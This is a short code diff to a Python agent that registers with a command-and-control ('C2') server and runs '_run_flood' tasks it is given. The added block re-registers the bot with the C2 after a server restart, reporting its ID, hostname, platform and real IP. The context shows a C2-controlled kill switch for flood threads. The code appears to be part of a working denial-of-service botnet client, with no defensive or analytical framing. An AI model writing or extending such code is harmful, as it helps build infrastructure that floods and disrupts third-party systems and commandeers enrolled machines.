@@ -346,6 +346,20 @@ def main():
                 "metrics": snap,
             })
 
+            # Server restarted and lost state — re-register immediately
+            if ping_resp.get("reregister"):
+                print("[agent] C2 lost state (restarted?) — re-registering...")
+                r = _post("/api/agent/register", {
+                    "id":           AGENT_ID,
+                    "hostname":     HOSTNAME,
+                    "platform":     PLATFORM,
+                    "ip":           _get_real_ip(),
+                    "metrics_port": METRICS_PORT,
+                })
+                if r.get("ok"):
+                    print("[agent] Re-registered with C2")
+                continue  # skip task poll this cycle
+
             # Kill switch: C2 can signal stop via ping response (works even while busy)
             if ping_resp.get("stop") and _BUSY.is_set():
                 _STOP.set()
@@ -360,7 +374,6 @@ def main():
                     t = threading.Thread(target=_run_flood, args=(task,), daemon=True)
                     t.start()
                 elif r.get("stop"):
-                    # Stop flag set before task even started — clear any queued task
                     _STOP.set()
                     print("[agent] Stop signal received (idle)")
 
